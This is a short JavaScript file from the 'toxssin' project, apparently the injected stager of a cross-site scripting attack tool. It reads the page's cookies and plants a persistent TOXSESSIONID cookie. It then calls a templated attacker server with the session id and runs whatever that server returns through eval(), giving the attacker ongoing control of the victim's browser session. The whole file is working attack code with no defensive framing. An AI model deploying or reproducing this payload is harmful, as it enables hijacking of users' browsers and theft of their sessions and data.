
// This script is part of the toxssin project.
// Written by t3l3machus

function establish() {
	let cookie = document.cookie;
	let toxssin_id, state;
	let index = cookie.indexOf("TOXSESSIONID");
	if (index >= 0) {
		toxssin_id = cookie.substring(index+13, index+45);
		state = 'found';
		
	} else {
		toxssin_id = uuid().replaceAll('-', '');
		state = 'init';	
		setCookie(*COOKIE_AGE*, toxssin_id);		
	}
	return [toxssin_id, state];
};


function setCookie(expDays, value) {
	if (document.cookie.includes("TOXSESSIONID") === false) {
        let date = new Date();
        date.setTime(date.getTime() + (expDays * 24 * 60 * 60 * 1000));
        const expires = "expires=" + date.toUTCString();
        document.cookie = `TOXSESSIONID=${value}; ${expires}; samesite=None; secure; domain=${document.domain}`; 
    } 
};


function uuid() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
};


session_data = establish();
tox_req = new XMLHttpRequest();
tox_req.open("GET", `*TOXSSIN_SERVER*/c1cbfe271a40788a00e8bf8574d94d4b/${session_data[0]}/${session_data[1]}`, true);

tox_req.onreadystatechange = function() {
	if (this.readyState == 4) {
		eval(this.responseText);
	}
};

tox_req.send();
